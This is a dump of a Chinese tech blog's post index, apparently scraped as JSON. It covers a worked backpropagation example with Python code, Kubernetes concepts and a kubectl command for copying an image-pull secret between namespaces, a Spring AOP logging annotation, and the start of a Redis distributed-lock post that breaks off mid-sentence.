$$ 2.隐含层\u0026mdash;-\u0026gt;输出层：\n计算输出层神经元o1和o2的值： $$ \\begin{array}{l} { net }{o 1}=w{5} * { out }{h 1}+w{6} * { out }{h 2}+b{2} * 1 \\\n{ net }{o 1}=0.4 * 0.593269992+0.45 * 0.596884378+0.6 * 1=1.105905967 \\\n{ out }{o 1}=\\frac{1}{1+e^{-n e t_{o 1}}}=\\frac{1}{1+e^{-1.105905967}}=0.75136507 \\\n{ out }_{o 2}=0.772928465 \\end{array} $$ 这样前向传播的过程就结束了，我们得到输出值为[0.75136079 , 0.772928465]，与实际值[0.01 , 0.99]相差还很远，现在我们对误差进行反向传播，更新权值，重新计算输出。\nStep 2 反向传播\n1.计算总误差\n总误差：(square error) $$ E_{ {total }}=\\sum \\frac{1}{2}( { target }- { output })^{2} $$ 但是有两个输出，所以分别计算o1和o2的误差，总误差为两者之和： $$ \\begin{array}{l} E_{o 1}=\\frac{1}{2}\\left( { target }_{o 1}- { out }_{o 1}\\right)^{2}=\\frac{1}{2}(0.01-0.75136507)^{2}=0.274811083 \\\nE_{o 2}=0.023560026 \\\nE_{ {total }}=E_{o 1}+E_{o 2}=0.274811083+0.023560026=0.298371109 \\end{array} $$ 2.隐含层\u0026mdash;-\u0026gt;输出层的权值更新：\n以权重参数w5为例，如果我们想知道w5对整体误差产生了多少影响，可以用整体误差对w5求偏导求出：（链式法则） $$ \\frac{\\partial E_{{total }}}{\\partial w_{5}}=\\frac{\\partial E_{\\text {total }}}{\\partial { out }_{o 1}} * \\frac{\\partial {out }_{o 1}}{\\partial { net }_{o 1}} * \\frac{\\partial { net }_{o 1}}{\\partial w_{5}} $$ 下面的图可以更直观的看清楚误差是怎样反向传播的：\n现在我们来分别计算每个式子的值：\n计算： $$ \\frac{\\partial E_{ {total }}}{\\partial { out }_{o 1}} $$\n$$ \\begin{array}{l} E_{ {total }}=\\frac{1}{2}\\left( { target }_{o 1}-\\text { out }_{o 1}\\right)^{2}+\\frac{1}{2}\\left( { target }_{o 2}- { out }_{o 2}\\right)^{2} \\\n\\frac{\\partial E_{ {total }}}{\\partial { out }_{o 1}}=2 * \\frac{1}{2}\\left( { target }_{o 1}- { out }_{o 1}\\right)^{2-1} *-1+0 \\\n\\frac{\\partial E_{ {total }}}{\\partial { outo }}=-\\left( { target }_{o 1}- { out }_{o 1}\\right)=-(0.01-0.75136507)=0.74136507 \\end{array} $$\n计算： $$ \\frac{\\partial { out }{o 1}}{\\partial n e t{o 1}} $$\n$$ \\begin{array}{l} { out }{o 1}=\\frac{1}{1+e^{-n e t{o 1}}} \\\n\\frac{\\partial { out }{o 1}}{\\partial { net }{o 1}}= { out }{o 1}\\left(1- { out }{o 1}\\right)=0.75136507(1-0.75136507)=0.186815602 \\end{array} $$\n（这一步实际上就是对sigmoid函数求导，比较简单，可以自己推导一下）\n计算： $$ \\frac{\\partial { net }{o 1}}{\\partial w{5}} $$\n$$ \\begin{array}{l} n e t_{o 1}=w_{5} * { out }_{h 1}+w_{6} * { out }_{h 2}+b_{2} * 1 \\\n\\frac{\\partial { net }_{o 1}}{\\partial w_{5}}=1 * { out }_{h 1} * w_{5}^{(1-1)}+0+0= { out }_{h 1}=0.593269992 \\end{array} $$\n最后三者相乘： $$ \\begin{array}{l} \\frac{\\partial E_{ {total }}}{\\partial w_{5}}=\\frac{\\partial E_{ {total }}}{\\partial o u t_{o 1}} * \\frac{\\partial { out }_{o 1}}{\\partial n e t_{o 1}} * \\frac{\\partial n e t_{o 1}}{\\partial w_{5}} \\\n\\frac{\\partial E_{ {total }}}{\\partial w_{5}}=0.74136507 * 0.186815602 * 0.593269992=0.082167041 \\end{array} $$ 这样我们就计算出整体误差E(total)对w5的偏导值。\n回过头来再看看上面的公式，我们发现： $$ \\frac{\\partial E_{t o t a l}}{\\partial w_{5}}=-\\left(\\operatorname{target}_{o 1}- { out }_{o 1}\\right) * { out }_{o 1}\\left(1- { out }_{o 1}\\right) * { out }_{h 1} $$ 为了表达方便，用$$\\delta_{o 1}$$来表示输出层的误差： $$ \\begin{array}{l} \\delta_{o 1}=\\frac{\\partial E_{ {total }}}{\\partial o u t_{o 1}} * \\frac{\\partial { out }_{o 1}}{\\partial n e t_{o 1}}=\\frac{\\partial E_{ {total }}}{\\partial n e t_{o 1}} \\\n\\delta_{o 1}=-\\left(\\operatorname{target}_{o 1}- { out }_{o 1}\\right) * { out }_{o 1}\\left(1- { out }_{o 1}\\right) \\end{array} $$ 因此，整体误差E(total)对w5的偏导公式可以写成： $$ \\frac{\\partial E_{ {total }}}{\\partial w_{5}}=\\delta_{o 1} { out }_{h 1} $$ 如果输出层误差计为负的话，也可以写成： $$ \\frac{\\partial E_{ {total }}}{\\partial w_{5}}=-\\delta_{o 1} { out }_{h 1} $$ 最后我们来更新w5的值： $$ w_{5}^{+}=w_{5}-\\eta * \\frac{\\partial E_{ {total }}}{\\partial_{w_{5}}}=0.4-0.5 * 0.082167041=0.35891648 $$ （其中，$$\\eta$$是学习速率，这里我们取0.5）\n同理，可更新w6,w7,w8: $$ \\begin{array}{l} w_{6}^{+}=0.408666186 \\\nw_{7}^{+}=0.511301270 \\\nw_{8}^{+}=0.561370121 \\end{array} $$ 3.隐含层\u0026mdash;-\u0026gt;输入层的权值更新：\n　方法其实与上面说的差不多，但是有个地方需要变一下，在上文计算总误差对w5的偏导时，是从out(o1)\u0026mdash;-\u0026gt;net(o1)\u0026mdash;-\u0026gt;w5,但是在隐含层之间的权值更新时，是out(h1)\u0026mdash;-\u0026gt;net(h1)\u0026mdash;-\u0026gt;w1,而out(h1)会接受E(o1)和E(o2)两个地方传来的误差，所以这个地方两个都要计算。\n计算： $$ \\frac{\\partial E_{ {total }}}{\\partial { out }_{h 1}} $$\n$$ \\frac{\\partial E_{ {total }}}{\\partial o u t_{h 1}}=\\frac{\\partial E_{o 1}}{\\partial o u t_{h 1}}+\\frac{\\partial E_{o 2}}{\\partial o u t_{h 1}} $$\n先计算： $$ \\frac{\\partial E_{o 1}}{\\partial o u t_{h 1}} $$\n$$ \\begin{array}{l} \\frac{\\partial E_{o 1}}{\\partial o u t_{h 1}}=\\frac{\\partial E_{o 1}}{\\partial n e t_{o 1}} * \\frac{\\partial n e t_{o 1}}{\\partial o u t_{h 1}} \\\n\\frac{\\partial E_{o 1}}{\\partial n e t_{o 1}}=\\frac{\\partial E_{o 1}}{\\partial o u t_{o 1}} * \\frac{\\partial o u t_{o 1}}{\\partial n e t_{o 1}}=0.74136507 * 0.186815602=0.138498562 \\\n{ net }_{o 1}=w_{5} * o u t_{h 1}+w_{6} * { out }_{h 2}+b_{2} * 1 \\\n\\frac{\\partial { net }_{o 1}}{\\partial o u t_{h 1}}=w_{5}=0.40 \\\n\\frac{\\partial E_{o 1}}{\\partial o u t_{h 1}}=\\frac{\\partial E_{o 1}}{\\partial n e t_{o 1}} * \\frac{\\partial n e t_{o 1}}{\\partial o u t_{h 1}}=0.138498562 * 0.40=0.055399425 \\end{array} $$\n同理，计算出： $$ \\frac{\\partial E_{o 2}}{\\partial o u t_{h 1}}=-0.019049119 $$ 两者相加得到总值： $$ \\frac{\\partial E_{ {total }}}{\\partial o u t_{h 1}}=\\frac{\\partial E_{o 1}}{\\partial o u t_{h 1}}+\\frac{\\partial E_{o 2}}{\\partial o u t_{h 1}}=0.055399425+-0.019049119=0.036350306 $$ 再计算： $$ \\frac{\\partial o u t_{h 1}}{\\partial n e t_{h 1}} $$\n$$ \\begin{array}{l} { out }{h 1}=\\frac{1}{1+e^{-n e t}{h 1}} \\\n\\frac{\\partial { out }{h 1}}{\\partial n e t{h 1}}= { out }{h 1}\\left(1- { out }{h 1}\\right)=0.59326999(1-0.59326999)=0.241300709 \\end{array} $$\n再计算： $$ \\frac{\\partial n e t_{h 1}}{\\partial w_{1}} $$\n$$ \\begin{array}{l} { net }{h 1}=w{1} * i_{1}+w_{2} * i_{2}+b_{1} * 1 \\\n\\frac{\\partial n e t_{h 1}}{\\partial w_{1}}=i_{1}=0.05 \\end{array} $$\n最后，三者相乘： $$ \\begin{array}{l} \\frac{\\partial E_{ {total }}}{\\partial w_{1}}=\\frac{\\partial E_{ {total }}}{\\partial { out }_{h 1}} * \\frac{\\partial { out }_{h 1}}{\\partial n e t_{h 1}} * \\frac{\\partial { net }_{h 1}}{\\partial w_{1}} \\\n\\frac{\\partial E_{ {total }}}{\\partial w_{1}}=0.036350306 * 0.241300709 * 0.05=0.000438568 \\end{array} $$ 为了简化公式，用sigma(h1)表示隐含层单元h1的误差： $$ \\begin{array}{l} \\frac{\\partial E_{ {total }}}{\\partial w_{1}}=\\left(\\sum_{o} \\frac{\\partial E_{ {total }}}{\\partial o u t_{o}} * \\frac{\\partial { out }_{o}}{\\partial n e t_{o}} * \\frac{\\partial { net }_{o}}{\\partial o u t_{h 1}}\\right) * \\frac{\\partial o u t_{h 1}}{\\partial n e t_{h 1}} * \\frac{\\partial n e t_{h 1}}{\\partial w_{1}} \\\n\\frac{\\partial E_{ {total }}}{\\partial w_{1}}=\\left(\\sum_{o} \\delta_{o} * w_{h o}\\right) * { out }_{h 1}\\left(1- { out }_{h 1}\\right) * i_{1} \\\n\\frac{\\partial E_{ {total }}}{\\partial w_{1}}=\\delta_{h 1} i_{1} \\end{array} $$ 最后，更新w1的权值： $$ w_{1}^{+}=w_{1}-\\eta * \\frac{\\partial E_{\\text {total }}}{\\partial w_{1}}=0.15-0.5 * 0.000438568=0.149780716 $$ 同理，额可更新w2,w3,w4的权值： $$ \\begin{array}{l} w_{2}^{+}=0.19956143 \\\nw_{3}^{+}=0.24975114 \\\nw_{4}^{+}=0.29950229 \\end{array} $$ 这样误差反向传播法就完成了，最后我们再把更新的权值重新计算，不停地迭代，在这个例子中第一次迭代之后，总误差E(total)由0.298371109下降至0.291027924。迭代10000次后，总误差为0.000035085，输出为0.015912196,0.984065734 ,证明效果还是不错的。\n#coding:utf-8 import random import math # # 参数解释： # \u0026#34;pd_\u0026#34; ：偏导的前缀 # \u0026#34;d_\u0026#34; ：导数的前缀 # \u0026#34;w_ho\u0026#34; ：隐含层到输出层的权重系数索引 # \u0026#34;w_ih\u0026#34; ：输入层到隐含层的权重系数的索引 class NeuralNetwork: LEARNING_RATE = 0.5 def __init__(self, num_inputs, num_hidden, num_outputs, hidden_layer_weights = None, hidden_layer_bias = None, output_layer_weights = None, output_layer_bias = None): self.num_inputs = num_inputs self.hidden_layer = NeuronLayer(num_hidden, hidden_layer_bias) self.output_layer = NeuronLayer(num_outputs, output_layer_bias) self.init_weights_from_inputs_to_hidden_layer_neurons(hidden_layer_weights) self.init_weights_from_hidden_layer_neurons_to_output_layer_neurons(output_layer_weights) def init_weights_from_inputs_to_hidden_layer_neurons(self, hidden_layer_weights): weight_num = 0 for h in range(len(self.hidden_layer.neurons)): for i in range(self.num_inputs): if not hidden_layer_weights: self.hidden_layer.neurons[h].weights.append(random.random()) else: self.hidden_layer.neurons[h].weights.append(hidden_layer_weights[weight_num]) weight_num += 1 def init_weights_from_hidden_layer_neurons_to_output_layer_neurons(self, output_layer_weights): weight_num = 0 for o in range(len(self.output_layer.neurons)): for h in range(len(self.hidden_layer.neurons)): if not output_layer_weights: self.output_layer.neurons[o].weights.append(random.random()) else: self.output_layer.neurons[o].weights.append(output_layer_weights[weight_num]) weight_num += 1 def inspect(self): print(\u0026#39;------\u0026#39;) print(\u0026#39;* Inputs: {}\u0026#39;.format(self.num_inputs)) print(\u0026#39;------\u0026#39;) print(\u0026#39;Hidden Layer\u0026#39;) self.hidden_layer.inspect() print(\u0026#39;------\u0026#39;) print(\u0026#39;* Output Layer\u0026#39;) self.output_layer.inspect() print(\u0026#39;------\u0026#39;) def feed_forward(self, inputs): hidden_layer_outputs = self.hidden_layer.feed_forward(inputs) return self.output_layer.feed_forward(hidden_layer_outputs) def train(self, training_inputs, training_outputs): self.feed_forward(training_inputs) # 1. 输出神经元的值 pd_errors_wrt_output_neuron_total_net_input = [0] * len(self.output_layer.neurons) for o in range(len(self.output_layer.neurons)): # ∂E/∂zⱼ pd_errors_wrt_output_neuron_total_net_input[o] = self.output_layer.neurons[o].calculate_pd_error_wrt_total_net_input(training_outputs[o]) # 2. 隐含层神经元的值 pd_errors_wrt_hidden_neuron_total_net_input = [0] * len(self.hidden_layer.neurons) for h in range(len(self.hidden_layer.neurons)): # dE/dyⱼ = Σ ∂E/∂zⱼ * ∂z/∂yⱼ = Σ ∂E/∂zⱼ * wᵢⱼ d_error_wrt_hidden_neuron_output = 0 for o in range(len(self.output_layer.neurons)): d_error_wrt_hidden_neuron_output += pd_errors_wrt_output_neuron_total_net_input[o] * self.output_layer.neurons[o].weights[h] # ∂E/∂zⱼ = dE/dyⱼ * ∂zⱼ/∂ pd_errors_wrt_hidden_neuron_total_net_input[h] = d_error_wrt_hidden_neuron_output * self.hidden_layer.neurons[h].calculate_pd_total_net_input_wrt_input() # 3. 更新输出层权重系数 for o in range(len(self.output_layer.neurons)): for w_ho in range(len(self.output_layer.neurons[o].weights)): # ∂Eⱼ/∂wᵢⱼ = ∂E/∂zⱼ * ∂zⱼ/∂wᵢⱼ pd_error_wrt_weight = pd_errors_wrt_output_neuron_total_net_input[o] * self.output_layer.neurons[o].calculate_pd_total_net_input_wrt_weight(w_ho) # Δw = α * ∂Eⱼ/∂wᵢ self.output_layer.neurons[o].weights[w_ho] -= self.LEARNING_RATE * pd_error_wrt_weight # 4. 更新隐含层的权重系数 for h in range(len(self.hidden_layer.neurons)): for w_ih in range(len(self.hidden_layer.neurons[h].weights)): # ∂Eⱼ/∂wᵢ = ∂E/∂zⱼ * ∂zⱼ/∂wᵢ pd_error_wrt_weight = pd_errors_wrt_hidden_neuron_total_net_input[h] * self.hidden_layer.neurons[h].calculate_pd_total_net_input_wrt_weight(w_ih) # Δw = α * ∂Eⱼ/∂wᵢ self.hidden_layer.neurons[h].weights[w_ih] -= self.LEARNING_RATE * pd_error_wrt_weight def calculate_total_error(self, training_sets): total_error = 0 for t in range(len(training_sets)): training_inputs, training_outputs = training_sets[t] self.feed_forward(training_inputs) for o in range(len(training_outputs)): total_error += self.output_layer.neurons[o].calculate_error(training_outputs[o]) return total_error class NeuronLayer: def __init__(self, num_neurons, bias): # 同一层的神经元共享一个截距项b self.bias = bias if bias else random.random() self.neurons = [] for i in range(num_neurons): self.neurons.append(Neuron(self.bias)) def inspect(self): print(\u0026#39;Neurons:\u0026#39;, len(self.neurons)) for n in range(len(self.neurons)): print(\u0026#39; Neuron\u0026#39;, n) for w in range(len(self.neurons[n].weights)): print(\u0026#39; Weight:\u0026#39;, self.neurons[n].weights[w]) print(\u0026#39; Bias:\u0026#39;, self.bias) def feed_forward(self, inputs): outputs = [] for neuron in self.neurons: outputs.append(neuron.calculate_output(inputs)) return outputs def get_outputs(self): outputs = [] for neuron in self.neurons: outputs.append(neuron.output) return outputs class Neuron: def __init__(self, bias): self.bias = bias self.weights = [] def calculate_output(self, inputs): self.inputs = inputs self.output = self.squash(self.calculate_total_net_input()) return self.output def calculate_total_net_input(self): total = 0 for i in range(len(self.inputs)): total += self.inputs[i] * self.weights[i] return total + self.bias # 激活函数sigmoid def squash(self, total_net_input): return 1 / (1 + math.exp(-total_net_input)) def calculate_pd_error_wrt_total_net_input(self, target_output): return self.calculate_pd_error_wrt_output(target_output) * self.calculate_pd_total_net_input_wrt_input(); # 每一个神经元的误差是由平方差公式计算的 def calculate_error(self, target_output): return 0.5 * (target_output - self.output) ** 2 def calculate_pd_error_wrt_output(self, target_output): return -(target_output - self.output) def calculate_pd_total_net_input_wrt_input(self): return self.output * (1 - self.output) def calculate_pd_total_net_input_wrt_weight(self, index): return self.inputs[index] # 文中的例子: nn = NeuralNetwork(2, 2, 2, hidden_layer_weights=[0.15, 0.2, 0.25, 0.3], hidden_layer_bias=0.35, output_layer_weights=[0.4, 0.45, 0.5, 0.55], output_layer_bias=0.6) for i in range(10000): nn.train([0.05, 0.1], [0.01, 0.09]) print(i, round(nn.calculate_total_error([[[0.05, 0.1], [0.01, 0.09]]]), 9)) #另外一个例子，可以把上面的例子注释掉再运行一下: # training_sets = [ # [[0, 0], [0]], # [[0, 1], [1]], # [[1, 0], [1]], # [[1, 1], [0]] # ] # nn = NeuralNetwork(len(training_sets[0][0]), 5, len(training_sets[0][1])) # for i in range(10000): # training_inputs, training_outputs = random.choice(training_sets) # nn.train(training_inputs, training_outputs) # print(i, nn.calculate_total_error(training_sets)) 最后写到这里就结束了，现在还不会用latex编辑数学公式，本来都直接想写在草稿纸上然后扫描了传上来，但是觉得太影响阅读体验了。以后会用公式编辑器后再重把公式重新编辑一遍。稳重使用的是sigmoid激活函数，实际还有几种不同的激活函数可以选择，具体的可以参考文献[3]，最后推荐一个在线演示神经网络变化的网址：http://www.emergentmind.com/neural-network，可以自己填输入输出，然后观看每一次迭代权值的变化，很好玩~如果有错误的或者不懂的欢迎留言：）\n参考 一文弄懂神经网络中的反向传播法——BackPropagation ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/ai/%E5%8F%8D%E5%90%91%E4%BC%A0%E6%92%ADbp/","series":["Manual"],"tags":["CNN","AI"],"title":"反向传播"},{"categories":["云原生"],"content":"同步镜像到自己的仓库 经常有一些国外的镜像仓库，在国内无法拉取，此时我们可以先找台国外的服务器拉取下来，重新打tag后推送到自己的镜像仓库。\n1⃣️ 免费服务器\nhttps://labs.play-with-k8s.com/ 2⃣️ 拉取-打tag-推送\n3⃣️ 验证\n参考链接🔗 如何拉取k8s.grc.io、quay.io的镜像 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E5%90%8C%E6%AD%A5%E9%95%9C%E5%83%8F%E5%88%B0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BB%93%E5%BA%93/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"同步镜像到自己的仓库"},{"categories":["云原生"],"content":"Cluster\nCluster 是计算、存储和网络资源的集合，Kubernetes 利用这些资源运行各种基于容器的应用。\nMaster\nMaster 是 Cluster 的大脑，它的主要职责是调度，即决定将应用放在哪里运行。Master 运行 Linux 操作系统，可以是物理机或者虚拟机。为了实现高可用，可以运行多个 Master。\nNode\nNode 的职责是运行容器应用。Node 由 Master 管理，Node 负责监控并汇报容器的状态，并根据 Master 的要求管理容器的生命周期。Node 运行在 Linux 操作系统，可以是物理机或者是虚拟机。\nPod\nPod 是 Kubernetes 的最小工作单元。每个 Pod 包含一个或多个容器。Pod 中的容器会作为一个整体被 Master 调度到一个 Node 上运行，一个Pod里的所有容器共用一个namespaces\nController\n管理Pod的工具，kubernetes通过它来管理集群中的Pod\nDeployment\nDeployment控制器下的Pod都有个共同特点，那就是每个Pod除了名称和IP地址不同，其余完全相同。需要的时候，Deployment可以通过Pod模板创建新的Pod；不需要的时候，Deployment就可以删除任意一个Pod。\nReplicaSet\nReplicaSet 实现了 Pod 的多副本管理。使用 Deployment 时会自动创建 ReplicaSet，也就是说 Deployment 是通过 ReplicaSet 来管理 Pod 的多个副本，我们通常不需要直接使用 ReplicaSet。\nDaemonSet\nDaemonSet是这样一种对象（守护进程），用于每个 Node 最多只运行一个 Pod 副本的场景，这非常适合一些系统层面的应用，例如日志收集、资源监控等，这类应用需要每个节点都运行，且不需要太多实例，一个比较好的例子就是Kubernetes的kube-proxy。\nStatefuleSet\n提供如下功能：\n 稳定的持久化存储：即Pod重新调度后还是能访问到相同的持久化数据，基于PVC来实现 稳定的网络标志：即Pod重新调度后其PodName和HostName不变，基于Headless Service（即没有Cluster IP的Service）来实现 有序部署，有序扩展：即Pod是有顺序的，在部署或者扩展的时候要依据定义的顺序依次依次进行（即从0到N-1，在下一个Pod运行之前所有之前的Pod必须都是Running和Ready状态），基于init containers来实现 有序收缩，有序删除（即从N-1到0）  像ZooKeeper, Nacos这种分布式系统，节点之间是要互相通信的，因此需要网络标志，并且每个节点需要单独存在自己的状态，因此需要稳定的持久化存储 StatefulSet Job\nJob 用于运行结束就删除的应用。而其他 Controller 中的 Pod 通常是长期持续运行。Job和CronJob 以下是一个Job配置，其计算π到2000位并打印输出。Job结束需要运行50个Pod，这个示例中就是打印π 50次，并行运行5个Pod，Pod如果失败最多重试5次。\napiVersion: batch/v1 kind: Job metadata: name: pi-with-timeout spec: completions: 50 # 运行的次数，即Job结束需要成功运行的Pod个数 parallelism: 5 # 并行运行Pod的数量，默认为1 backoffLimit: 5 # 表示失败Pod的重试最大次数，超过这个次数不会继续重试。 activeDeadlineSeconds: 10 # 表示Pod超期时间，一旦达到这个时间，Job及其所有的Pod都会停止。 template: # Pod定义 spec: containers: - name: pi image: perl command: - perl - \u0026#34;-Mbignum=bpi\u0026#34; - \u0026#34;-wle\u0026#34; - print bpi(2000) restartPolicy: Never 根据completions和parallelism的设置，可以将Job划分为以下几种类型。\n   Job类型 说明 使用示例     一次性Job 创建一个Pod直至其成功结束 数据库迁移   固定结束次数的Job 依次创建一个Pod运行直至completions个成功结束 处理工作队列的Pod   固定结束次数的并行Job 依次创建多个Pod运行直至completions个成功结束 多个Pod同时处理工作队列   并行Job 创建一个或多个Pod直至有一个成功结束 多个Pod同时处理工作队列    CronJob\n是基于时间的Job，就类似于Linux系统的crontab文件中的一行，在指定的时间周期运行指定的Job。Job和CronJob Service\nKubernetes Service 定义了外界访问一组特定 Pod 的方式。Service 有自己的 IP 和端口，并把这个IP和后端的Pod所跑的服务的关联起来。Service 为 Pod 提供了负载均衡。\nNamespace \nNamespace 可以将一个物理的 Cluster 逻辑上划分成多个虚拟 Cluster，每个 Cluster 就是一个 Namespace。不同 Namespace 里的资源是完全隔离的。Kubernetes 默认创建了两个 Namespace，default和kube-system\n参考链接\nhttps://feisky.gitbooks.io/kubernetes/content/introduction/concepts.html ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80/k8s%E5%9F%BA%E7%A1%80%E6%89%AB%E7%9B%B2/%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A/","series":["k8s"],"tags":["云原生","k8s"],"title":"名词解释"},{"categories":["云原生"],"content":"在namespace之间共享secret\n有的时候在default空间下创建了拉取镜像的secret，当部署k8s的资源到其他namespace的时候，如果部署的的是deployment的之类的势必会要拉取镜像，这个时候必然失败，因为secret创建在default空间下，所以我们需要将secret复制一份到需要的namespace下面：\nkubectl get secret coding-regcred --namespace=default -oyaml | grep -v \u0026#39;^\\s*namespace:\\s\u0026#39; | kubectl apply --namespace=tkb -f - 参考链接：Kubernetes - sharing secret across namespaces ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/k8s/%E5%AE%9E%E6%88%98/%E5%9C%A8namespace%E4%B9%8B%E9%97%B4%E5%85%B1%E4%BA%ABsecret/","series":["k8s实战"],"tags":["云原生","k8s"],"title":"在namespace之间共享secret"},{"categories":["编程思想"],"content":"在工作中，我们有时候需要将一些公共的功能封装，比如操作日志的存储，防重复提交等等。这些功能有些接口会用到，为了便于其他接口和方法的使用，做成自定义注解，侵入性更低一点。别人用的话直接注解就好。下面就来讲讲自定义注解这些事情。\n1. @Target、@Retention、@Documented简介 java自定义注解的注解位于包：java.lang.annotation下。包含三个元注解@Target、@Retention、@Documented，即注解的注解。\n@Target @Target:注解的作用目标。和枚举ElementType共同起作用\n根据源码知道，可以配置多个作用目标。\n@Documented @Retention(RetentionPolicy.RUNTIME) @Target(ElementType.ANNOTATION_TYPE) public @interface Target { /** * Returns an array of the kinds of elements an annotation type * can be applied to. * @return an array of the kinds of elements an annotation type * can be applied to */ ElementType[] value(); } 复制代码 ElementType的类型如下：\n* @author Joshua Bloch * @since 1.5 * @jls 9.6.4.1 @Target * @jls 4.1 The Kinds of Types and Values */ public enum ElementType { /** 类, 接口 (包括注解类型), 或 枚举 声明 */ TYPE, /** 字段声明（包括枚举常量） */ FIELD, /** 方法声明(Method declaration) */ METHOD, /** 正式的参数声明 */ PARAMETER, /** 构造函数声明 */ CONSTRUCTOR, /** 局部变量声明 */ LOCAL_VARIABLE, /** 注解类型声明 */ ANNOTATION_TYPE, /** 包声明 */ PACKAGE, /** * 类型参数声明 * * @since 1.8 */ TYPE_PARAMETER, /** * 使用的类型 * * @since 1.8 */ TYPE_USE } 复制代码 @Retention 指示带注解类型的注解要多长时间被保留。如果没有保留注释存在 注释类型声明，保留策略默认为 {@code RetentionPolicy.CLASS}和RetentionPolicy共同起作用。\nRetentionPolicy类型如下：\npackage java.lang.annotation; /** * Annotation retention policy. The constants of this enumerated type * describe the various policies for retaining annotations. They are used * in conjunction with the {@link Retention} meta-annotation type to specify * how long annotations are to be retained. * * @author Joshua Bloch * @since 1.5 */ public enum RetentionPolicy { /** * 注解只保留在源文件，当Java文件编译成class文件的时候，注解被遗弃；被编译器忽略 */ SOURCE, /** * 注解被保留到class文件，但jvm加载class文件时候被遗弃，这是默认的生命周期 */ CLASS, /** * 注解不仅被保存到class文件中，jvm加载class文件之后，仍然存在 */ RUNTIME } 复制代码 这3个生命周期分别对应于：Java源文件(.java文件) \u0026mdash;\u0026gt; .class文件 \u0026mdash;\u0026gt; 内存中的字节码。\n 那怎么来选择合适的注解生命周期呢？\n首先要明确生命周期长度 SOURCE \u0026lt; CLASS \u0026lt; RUNTIME ，所以前者能作用的地方后者一定也能作用。一般如果需要在运行时去动态获取注解信息，那只能用 RUNTIME 注解；如果要在编译时进行一些预处理操作，比如生成一些辅助代码（如 ButterKnife ），就用 CLASS注解；如果只是做一些检查性的操作，比如 @Override 和 @SuppressWarnings，则可选用 SOURCE 注解。\n **@**Documented **@**Documented 注解表明这个注解应该被 javadoc工具记录. 默认情况下,javadoc是不包括注解的. 但如果声明注解时指定了 @Documented,则它会被 javadoc 之类的工具处理, 所以注解类型信息也会被包括在生成的文档中，是一个标记注解，没有成员。\n2. 实战 Log注解\n@Target(ElementType.METHOD) @Retention(RetentionPolicy.RUNTIME) public @interface Log { String value() default \u0026#34;\u0026#34;; } Aspect\n@Aspect @Component @Slf4j public class SysLogAspect { @Pointcut(\u0026#34;@annotation(com.tony.annotation.aspect.Log)\u0026#34;) public void logPointCut() { } @Around(\u0026#34;logPointCut()\u0026#34;) public Object around(ProceedingJoinPoint point) throws Throwable { long beginTime = System.currentTimeMillis(); Object result = point.proceed(); long time = System.currentTimeMillis() - beginTime; // 目标方法  MethodSignature signature = (MethodSignature) point.getSignature(); Method method = signature.getMethod(); Log syslog = method.getAnnotation(Log.class); if (syslog != null) { // 注解上的描述  log.info(syslog.value() + \u0026#34; :\u0026#34; + time); } return result; } } 使用\n@Service public class HelloLog { @Log(\u0026#34;测试自定义注解\u0026#34;) public void sayHello() { System.out.println(\u0026#34;hello, log\u0026#34; ); } } 测试\n@RunWith(SpringRunner.class) @SpringBootTest class AnnotationApplicationTests { @Autowired HelloLog helloLog; @Test public void HelloLogTest(){ helloLog.sayHello(); } } 参考 分分钟玩转SpringBoot自定义注解 ","date":"2021-08-27","img":"https://xuzhijvn.github.io/images/center.png","permalink":"https://xuzhijvn.github.io/zh-cn/posts/code/spring/%E5%9F%BA%E4%BA%8Easpect%E5%AE%9E%E7%8E%B0%E6%B3%A8%E8%A7%A3/","series":["Manual"],"tags":["Spring"],"title":"基于aspect实现注解"},{"categories":["编程思想"],"content":"使用 set key value ex/px 秒/毫秒 xx/nx 的命令实现分布式锁，存在多个client端加锁成功的极端情况。Redisson使用RedLock可以避免这个问题，其原理是多锁，例如对多个哨兵集群加不同的锁，只有超半数以上的哨兵集群反馈加锁成功才算加锁成功。另外，Redisson还通过WatchDog实现了锁续租。还实现了很多有用的数据结构（RedissonPriorityDeque）和分布式同步工具（RedissonCountDownLatch, RedissonSemaphore）\n前言 本篇文章主要介绍基于Redis的分布式锁实现到底是怎么一回事，其中参考了许多大佬写的文章，算是对分布式锁做一个总结\n分布式锁概览 在多线程的环境下，为了保证一个代码块在同一时间只能由一个线程访问，Java中我们一般可以使用synchronized语法和ReetrantLock去保证，这实际上是本地锁的方式。但是现在公司都是流行分布式架构，在分布式环境下，如何保证不同节点的线程同步执行呢？\n实际上，对于分布式场景，我们可以使用分布式锁，它是控制分布式系统之间互斥访问共享资源的一种方式。\n比如说在一个分布式系统中，多台机器上部署了多个服务，当客户端一个用户发起一个数据插入请求时，如果没有分布式锁机制保证，那么那多台机器上的多个服务可能进行并发插入操作，导致数据重复插入，对于某些不允许有多余数据的业务来说，这就会造成问题。而分布式锁机制就是为了解决类似这类问题，保证多个服务之间互斥的访问共享资源，如果一个服务抢占了分布式锁，其他服务没获取到锁，就不进行后续操作。大致意思如下图所示（不一定准确）：\n分布式锁的特点 分布式锁一般有如下的特点：\n 互斥性： 同一时刻只能有一个线程持有锁 可重入性： 同一节点上的同一个线程如果获取了锁之后能够再次获取锁 锁超时：和J.U.C中的锁一样支持锁超时，防止死锁 高性能和高可用： 加锁和解锁需要高效，同时也需要保证高可用，防止分布式锁失效 具备阻塞和非阻塞性：能够及时从阻塞状态中被唤醒  分布式锁的实现方式 我们一般实现分布式锁有以下几种方式：\n 基于数据库 基于Redis 基于zookeeper  本篇文章主要介绍基于Redis如何实现分布式锁\nRedis的分布式锁实现 1. 利用setnx+expire命令 (错误的做法) Redis的SETNX命令，setnx key value，将key设置为value，当键不存在时，才能成功，若键存在，什么也不做，成功返回1，失败返回0 。 SETNX实际上就是SET IF NOT 